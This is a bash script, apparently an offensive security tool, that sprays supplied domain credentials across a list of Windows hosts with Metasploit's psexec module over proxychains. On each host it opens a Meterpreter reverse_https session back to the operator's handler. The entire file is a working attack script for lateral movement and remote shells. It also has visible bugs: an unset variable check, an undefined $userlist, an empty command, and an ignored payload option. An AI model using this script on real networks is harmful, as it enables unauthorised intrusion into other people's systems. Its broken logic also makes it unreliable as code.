#!/bin/bash
#author: mp
#psexec a bunch of shit on a network with metasploit
#WARING: this shit is slow
#also you should start a handler for this
#setup: set your route, start auxiliary/server/socks4a and update proxychains conf to point at it

targets=""
user=""
pass=""
domain=""
payload=""
lhost=""
lport=""

usage() {
    echo "usage: $0 -t <targets> -u <user> -p <pass> -d <domain> -L <LHOST> -P <LPORT> -l <payload>"
    echo "  targets   : list of targets to spray creds at"
    echo "  user      : username to login with"
    echo "  pass      : password to use"
    echo "  domain    : domain to authenticate to"
    echo "  LHOST     : the ipv4 address of your handler"
    echo "  LPORT     : the port to catch sessions on"
    echo "  payload   : what payload to execute"
    exit 1
}

while [ -n "$1" ]; do 
    case "$1" in
        -t)
            shift; targets="$1";;
        -u)
            shift; user="$1";;
        -p)
            shift; pass="$1";;
        -d)
            shift; domain="$1";;
        -L)
            shift; lhost="$1";;
        -P)
            shift; lport="$1";;
        -l)
            shift; payload="$1";;
        *)
            echo "invalid switch"
            usage;;
    esac
    shift
done

[ -z "$network" -o -z "$user" -o -z "$pass" -o -z "$domain" -o -z "$lhost" -o -z "$lport" -o -z "$payload" ] && usage
[ ! -r "$targets" ] && echo "[!] cannot open $userlist" && exit 1

cat $targets | while read line ; do 
  proxychains /opt/metasploit-framework/msfconsole -q -n -x "use exploit/windows/smb/psexec ; set RHOST $line ; set SMBDomain $domain ; set SMBUser $user ; set SMBPass $pass ;  ; set PAYLOAD windows/x64/meterpreter/reverse_https ; set LHOST $lhost ; set LPORT $lport ; set DisablePayloadHandler True ; exploit ; exit -y"
done
